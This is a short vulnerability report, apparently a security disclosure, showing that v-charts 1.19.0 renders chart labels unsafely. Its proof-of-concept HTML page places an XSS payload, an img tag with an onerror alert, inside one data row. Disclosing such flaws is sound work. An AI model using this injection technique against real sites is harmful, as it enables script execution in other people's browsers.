# Description

`v-charts` is vulnerable to `Cross-Site Scripting (XSS)`.

# Steps To Reproduce

Copy the below content and save it into a .html file and open in any browser XSS payload will get executed.
```
<!DOCTYPE html>
<html lang="en">
<head>
  <title>v-charts</title>
</head>
<body>
  <div id="app">
    <ve-line :data="chartData"></ve-line>
  </div>
  <script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/echarts/dist/echarts.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/v-charts@1.19.0/lib/index.min.js"></script>
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/v-charts@1.19.0/lib/style.min.css">
  <script>
    new Vue({
      el: '#app',
      data: function () {
        return {
          chartData: {
        columns: ['ITEM', 'PV'],
        rows: [
          { 'ITEM': 'A', 'PV': 1231 },
          { 'ITEM': 'B', 'PV': 1223 },
          { 'ITEM': 'C', 'PV': 2123 },
          { 'ITEM': 'D"<img src=x onerror=alert("XSS")>', 'PV': 4123 },
          { 'ITEM': 'E', 'PV': 3123 },
          { 'ITEM': 'F', 'PV': 7123 }
        ]
          }
        }
      }
    })
  </script>
</body>
</html>
```
